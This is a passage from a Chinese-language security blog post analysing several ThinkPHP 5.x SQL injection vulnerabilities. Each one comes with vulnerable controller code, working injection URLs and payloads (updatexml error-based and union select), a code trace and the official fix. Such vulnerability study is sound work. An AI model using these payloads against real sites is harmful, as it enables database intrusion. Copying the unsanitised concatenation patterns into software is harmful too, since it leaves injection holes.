+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query <span class="variable">$query</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">list</span>(<span class="variable">$type</span>, <span class="variable">$value</span>) = <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//$data是我们传入的数组</span></span><br><span class="line">      <span class="keyword">switch</span> (strtolower(<span class="variable">$type</span>)) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">              <span class="variable">$fun</span>   = <span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="number">2</span>]) ? <span class="variable">$data</span>[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">              <span class="variable">$point</span> = <span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="number">3</span>]) ? <span class="variable">$data</span>[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">              <span class="keyword">if</span> (is_array(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                  <span class="variable">$value</span> = implode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="variable">$result</span> = <span class="variable">$fun</span> . <span class="string">&#x27;(\&#x27;&#x27;</span> . <span class="variable">$point</span> . <span class="string">&#x27;(&#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">              <span class="variable">$result</span> = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有任何的过滤将我们的恶意代码拼接了起来,所以可以构造出很多的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $fun . &#39;(\&#39;&#39; . $point . &#39;(&#39; . $value . &#39;)\&#39;)&#39;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$data</span>[<span class="number">2</span>] . <span class="string">&#x27;(\&#x27;&#x27;</span>. <span class="variable">$data</span>[<span class="number">3</span>].<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data</span>[<span class="number">1</span>].<span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>经过str_replace()于是我们的SQL语句就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `users` <span class="keyword">SET</span> `level` <span class="operator">=</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="operator">^</span>(<span class="string">&#x27;0(1)&#x27;</span>)  <span class="keyword">WHERE</span>  `id` <span class="operator">=</span> :where_AND_id</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方比较暴力的就直接删除了default语句块，并直接删除了<code>ParseArrayData</code>方法。</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fuqozknj31810kiaiq.jpg" alt="image-20210801133831247"></p>
+<h1 id="ThinkPHP-ParseWhereItem方法注入一"><a href="#ThinkPHP-ParseWhereItem方法注入一" class="headerlink" title="ThinkPHP ParseWhereItem方法注入一"></a>ThinkPHP ParseWhereItem方法注入一</h1><h2 id="漏洞概要-2"><a href="#漏洞概要-2" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句。再一个， <strong>Request</strong> 类的 <strong>filterValue</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，最终导致 <strong>SQL注入漏洞</strong> 的产生(<strong>select</strong> 方法注入) </p>
+<p>漏洞影响版本： <strong>ThinkPHP&lt;5.0.10</strong> [外面都说的是=5.0.10，具体原因后面会说]</p>
+<h2 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = input(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span> = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>])-&gt;select();</span><br><span class="line">        var_dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://yoursite/index.php/index/index?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()#</code></p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fuw6spzj31810idthw.jpg" alt="image-20210801185650811"></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>老样子因为漏洞不在where所以直接来到select方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt3fv31e8kj30xa0qa16z.jpg" alt="image-20210801232202894"></p>
+<p>进入<code>$sql = $this-&gt;builder-&gt;select($options)</code></p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fv8noi2j31340eswns.jpg" alt="image-20210801232415309"></p>
+<p>再进入<code>parseWhere</code>方法中的<code>$this-&gt;buildWhere-&gt;parseWhereItem</code>。</p>
+<p>这里代码太多我就截取关键点说一下</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fvdluckj312n0ntapq.jpg" alt="image-20210802110129618"></p>
+<p>因为$value是array可控，没有过滤。所以导致拼接造成我们的SQL注入。</p>
+<p>最后用七月火师傅的图来总结一下</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fvogs3jj31041fgx08.jpg" alt="9 (1)"></p>
+<h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方修复在<strong>Request.php</strong> 文件的 <strong>filterValue</strong> 方法中，过滤掉 <strong>NOT LIKE</strong> 关键字[图来自七月火师傅]</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3fvv3s45j31040l4ds6.jpg" alt="2"></p>
+<p>下图是七月师傅所述的</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fw6wmyij30w00mz16m.jpg" alt="image-20210801230301980"></p>
+<p>七月火师傅在漏洞修复说的是5.0.10以前是不存在的是因为他把<code>in_array</code>搜寻的东西搞错了</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fwd39jyj30wf0ksgw6.jpg" alt="image-20210801222712031"></p>
+<p>5.0.9复现过程</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt3fwilan2j315k0ko4dq.jpg" alt="image-20210801230139228"></p>
+<p>所以我认为关键点在这里</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fwobi2qj313n0n5wv7.jpg" alt="image-20210801225926634"></p>
+<h1 id="ThinkPHP-ParseWhereItem方法注入二"><a href="#ThinkPHP-ParseWhereItem方法注入二" class="headerlink" title="ThinkPHP ParseWhereItem方法注入二"></a>ThinkPHP ParseWhereItem方法注入二</h1><h2 id="漏洞概要-3"><a href="#漏洞概要-3" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生（ <strong>select</strong> 方法注入）</p>
+<p>漏洞影响版本： <strong>ThinkPHP5全版本</strong> 。</p>
+<h2 id="漏洞环境-3"><a href="#漏洞环境-3" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = request()-&gt;get(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span> = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>,<span class="variable">$username</span>)-&gt;select();</span><br><span class="line">        var_dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>介绍一下where中的exp吧</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo53cothj30zx0lq47e.jpg" alt="image-20210728135932523"></p>
+<p>例如下面两条语句是完全相等的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$map</span>[<span class="string">&#x27;username&#x27;</span>]  = <span class="keyword">array</span>(<span class="string">&#x27;in&#x27;</span>,<span class="string">&#x27;admin,r0ser1&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$map</span>[<span class="string">&#x27;username&#x27;</span>]  = <span class="keyword">array</span>(<span class="string">&#x27;exp&#x27;</span>,<span class="string">&#x27; IN (admin,r0ser1) &#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://yoursite/index.php/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)%23</code></p>
+<p>即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fwzysbrj31ez0g9k39.jpg" alt="image-20210802112424358"></p>
+<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>因为都是<strong>parseWhereItem</strong> 出现的问题上面一文分析过了一些点，我们这次只看关键点。</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fx4lok0j31250m6h1o.jpg" alt="image-20210802141447461"></p>
+<h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方无修复，并不承认这是一个漏洞认为这是他们提供的一个功能。</p>
+<h1 id="ThinkPHP-orderby-方法注入"><a href="#ThinkPHP-orderby-方法注入" class="headerlink" title="ThinkPHP orderby 方法注入"></a>ThinkPHP <strong>orderby</strong> 方法注入</h1><p>漏洞存在于 <strong>Builder</strong> 类的 <strong>parseOrder</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p>
+<p>漏洞影响版本： <strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong> 。</p>
+<h2 id="漏洞环境-4"><a href="#漏洞环境-4" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$orderby</span> = request()-&gt;get(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;R0ser1&#x27;</span>])-&gt;order(<span class="variable">$orderby</span>)-&gt;find();</span><br><span class="line">        var_dump(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<strong><a target="_blank" rel="noopener" href="http://localhost:8000/index/index/index?orderby%5Bid%60%7Cupdatexml(1,concat(0x7,user(),0x7e),1)%23%5D=1">http://localhost:8000/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1</a></strong></p>
+<p>即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fxccajnj31em0ewtj4.jpg" alt="image-20210802212151951"></p>
+<h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现在order嘛那我们直接看order函数。截取关键部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function order($field, $order = null)  //$field是我们传入的值</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$field</span>)) &#123;  </span><br><span class="line">        <span class="comment">//传入的是一个数组 进行合并然后赋值给$this-&gt;option</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>] = array_merge(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>], <span class="variable">$field</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>][] = <span class="variable">$field</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>; <span class="comment">//返回this this包含了$field </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再进入find函数，在 <strong>Connection</strong> 类的 <strong>find</strong> 方法中调用 <strong>Builder</strong> 类的 <strong>select</strong> 方法来生成 <strong>SQL</strong> 语句。相信大家对 <strong>Builder</strong> 类的 <strong>select</strong> 方法应该就不陌生了。前几篇分析文章中都有提及这个方法。这个方法通过 <strong>str_replace</strong> 函数将数据填充到 <strong>SQL</strong> 模板语句中。这次我们要关注的是 <strong>parseOrder</strong> 方法，这个方法在新版的 <strong>ThinkPHP</strong> 中做了代码调整，我们跟进。</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fxi3hkrj30kw0fl0z0.jpg" alt="image-20210802214231432"></p>
+<p>在 <strong>parseOrder</strong> 方法中，我们看到程序通过 <strong>parseKey</strong> 方法给变量两端都加上了反引号。然后直接拼接字符串返回没有任何过滤</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fxmmvv4j30v10ig7fp.jpg" alt="image-20210802215520276"></p>
+<p>导致我们最终的SQL语句就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;users&#96; WHERE  &#96;username&#96; &#x3D; :where_AND_username ORDER BY &#96;id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)#&#96; LIMIT 1  </span><br></pre></td></tr></table></figure>
+
+<p>[七月火前辈总结]</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fxuqwscj31040zjqh6.jpg" alt="8"></p>
+<h2 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方pass掉了了<code>)</code>和<code>#</code>，进行了修复。</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gt3fy1n4bcj31ew0iz7cm.jpg" alt="20210308213321144"></p>
+<h1 id="ThinkPHP-聚合查询注入"><a href="#ThinkPHP-聚合查询注入" class="headerlink" title="ThinkPHP 聚合查询注入"></a>ThinkPHP 聚合查询注入</h1><h2 id="漏洞概要-4"><a href="#漏洞概要-4" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于所有 <strong>Mysql</strong> 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p>
+<p>漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> 。</p>
+<p>不同版本 <strong>payload</strong> 需稍作调整：</p>
+<p><strong>5.0.0~5.0.21</strong>、 <strong>5.1.3～5.1.10</strong> ： <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p>
+<p><strong>5.1.11～5.1.25</strong> ： <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p>
+<h2 id="漏洞环境-5"><a href="#漏洞环境-5" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里用5.0.10复现学习</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$count</span> = input(<span class="string">&#x27;get.count&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span> = db(<span class="string">&#x27;users&#x27;</span>)-&gt;count(<span class="variable">$count</span>);</span><br><span class="line">        var_dump(<span class="variable">$res</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>聚合函数如下</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3fyd093xj30zt0fdjyq.jpg" alt="image-20210802160108583"></p>
+<p>访问<code> http://yoursite/index/index/index?data=id),(updatexml(1,concat(0x7,user(),0x7e),1)%23</code> 链接，即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的，当然我们也可以构造其他的语句）</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fyhgtilj618v0edn7c02.jpg" alt="image-20210802160943057"></p>
+<p>例如延时注入等</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fylunssj61f10iotk202.jpg" alt="image-20210802160801138"></p>
+<h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接到count方法这里</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fyqmr1rj31320f6tis.jpg" alt="image-20210802162304476"></p>
+<p>我们发现$this-&gt;value(里面的东西没有任何的过滤)直接拼接起来传递给value方法我们跟进看一下</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fyv8nxoj310w0dek0k.jpg" alt="image-20210802163731112"></p>
+<p>跟到$this-&gt;builder-&gt;select方法如下</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fyzcw7lj31600g4wou.jpg" alt="image-20210802163839070"></p>
+<p>$this-&gt;parseField</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fz3zj08j315o0dntgb.jpg" alt="image-20210802164244552"></p>
+<p>$this-&gt;parseKey</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fz9qv0rj31500knk5m.jpg" alt="image-20210802164225976"></p>
+<p>返回之后都赋值给array数组，然后再通过<code>$fieldsStr = implode(&#39;,&#39;, $array)</code>又把我们数组给拼接成字符串最终返回的语句如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(id),(updatexml(1,concat(0x7,user(),0x7e),1)) AS tp_count FROM &#96;users&#96; LIMIT 1  </span><br></pre></td></tr></table></figure>
+
+<p>最后放一个七月火师傅的总结【最后有七月火师傅的链接，大家可以看七月火师傅的。我也是跟着学习】</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fzfzebpj31041citx0.jpg" alt="7"></p>
+<h2 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方的修复方法是：当匹配到除了 <strong>字母、点号、星号</strong> 以外的字符时，就抛出异常。</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fztc3nfj31da0aj43z.jpg" alt="image-20210802172105742"></p>
+<h1 id="ThinkPHP-5-0-9鸡肋注入"><a href="#ThinkPHP-5-0-9鸡肋注入" class="headerlink" title="ThinkPHP 5.0.9鸡肋注入"></a>ThinkPHP 5.0.9鸡肋注入</h1><h2 id="漏洞概要-5"><a href="#漏洞概要-5" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>为什么说是鸡肋注入，因为TP5使用PDO查询。<strong>将参数与查询语句分离</strong>导致我们这个注入不支持子查询。就只能利用报错注入爆出一些内置函数。</p>
+<h2 id="关于这个漏洞的一些简单思考"><a href="#关于这个漏洞的一些简单思考" class="headerlink" title="关于这个漏洞的一些简单思考"></a>关于这个漏洞的一些简单思考</h2><p>这里就不复现了。下面会放P牛的那篇文章，这里就写一写我对这个鸡肋漏洞的思考吧。</p>
+<p>除了这一个洞，上面的所有SQL注入都是可以报数据的。当然我们不能用XPATH来爆，不然就会提示。</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fzyphlfj31es0fyame.jpg" alt="image-20210803103755324"></p>
+<p>仅仅支持常量。我们去wireshark发现在第一步预处理已经报错不走了。</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3g057wp3j30us0mch39.jpg" alt="image-20210803104118159"></p>
+<p>常量？何为常量，广义来讲也就是不变的量。用P牛的话来讲</p>
+<blockquote>
+<p>预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。</p>
+</blockquote>
+<p>因为像user() database()这就是常量因为他是库函数。</p>
+<p>那我们是否可以不用XPATH来爆呢。他不是提示<strong>Only constant XPATH queries are supported</strong></p>
+<p>当然是可以的，他回进行预处理-&gt;绑定-&gt;执行-&gt;报错</p>
+<p>那这个洞是到底可以不可以呢？</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3g0b2378j31du0fyk4a.jpg" alt="image-20210803104928062"></p>
+<p>提示的是参数为定义。那是哪一步出的问题呢？</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gt3g0g0e0yj316x0n5nh6.jpg" alt="image-20210803110430196"></p>
+<p>进入$this-&gt;query-&gt;bind发现赋值给this返回了</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3g0lvgi5j31790giqdj.jpg" alt="image-20210803110546415"></p>
+<p>回到Query.php中<code>$bind = $this-&gt;getBind();</code>// 获取参数绑定</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3g0qh080j311w0bktej.jpg" alt="image-20210803110654535"></p>
+<p>发现又返回给了bind后面预处理之后的调用了bind。</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3g0uvk90j30s009v42o.jpg" alt="image-20210803111750037"></p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3g0zfjoyj315j0j0wom.jpg" alt="image-20210803111929939"></p>
+<p>执行的时候又获取bind当我们看wireshark或许就可以发现答案</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3g14361tj31b50b648i.jpg" alt="image-20210803111959174"></p>
+<p>所以到bind时候就会报错。报参数未定义。因为这个漏洞我们利用的就是IN这里所以要加<code>,</code>or<code>)</code>等</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>七月火前辈：<a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>
+<p>P牛：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>
+                Author：<a href="http://example.com">
+                        R0ser1
+                    </a>
+                    <p>发表日期：<a href="http://example.com/2021/08/03/ThinkPHP5-x%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                            August 3rd 2021, 11:35:00 am
+                        </a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
+                    </p>
+        </div>
+        
+            <!-- paginator  -->
+            <ul class="post-paginator">
+                <li class="next">
+                    
+                </li>
+                <li class="previous">
+                    
+                        <div class="prevSlogan">Previous Post</div>
+                        <a href="/2021/07/29/Wordpress-4-9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" title="Wordpress<= 4.9.6任意文件删除漏洞">
+                            <div class="prevTitle">
+                                Wordpress<= 4.9.6任意文件删除漏洞
+                            </div>
+                        </a>
+                        
+                </li>
+            </ul>
+            <!-- 评论插件 -->
+            <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+                
+                    
+                         
+                            <!-- utteranc评论 -->
+
+                                <!-- partial('_partial/comment/changyan') -->
+                                <!--PC版-->
+
+
